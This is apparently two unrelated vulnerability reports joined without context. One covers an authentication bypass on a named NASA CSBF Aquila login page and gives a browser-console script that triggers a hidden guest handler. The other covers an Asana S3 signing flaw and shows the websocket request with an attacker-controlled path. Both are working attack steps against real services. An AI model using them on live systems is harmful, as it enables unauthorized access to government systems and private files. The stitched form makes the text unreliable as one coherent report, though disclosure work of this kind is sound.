An authentication bypass vulnerability exists in the NASA CSBF Aquila login system at https://www.csbf.nasa.gov/aquila/Default.aspx. Attackers can bypass authentication by triggering a commented-out "Guest" button event handler.
Trigger Guest Authentication Bypass
Execute in browser console:
document.getElementById('__EVENTTARGET').value = 'btnGuest';
document.forms[0].submit();

An S3 Bucket Misconfiguration allowed an attacker to set an arbitrary S3 Path and have it signed by the server. S3 Keys could be mined from online sources, putting a number of Asana Attachments at risk.
The vulnerability was found in the following websocket request:
{
  "msg": "mutation",
  "method": "/s3_attachment_create",
  "params": {
    "http_method": "post",
    "endpoint_data": {
      "global_id": "...",
      "domain": "...",
      "filesize": 1000,
      "s3_path": "S3_PATH",
      "__app_name": "Asana",
      "__session_id": "..."
    }
  },
  "id": "..."
}
Where "s3_path" was a parameter discovered in the JavaScript code. The original parameter: "key_suffix" was not vulnerable.
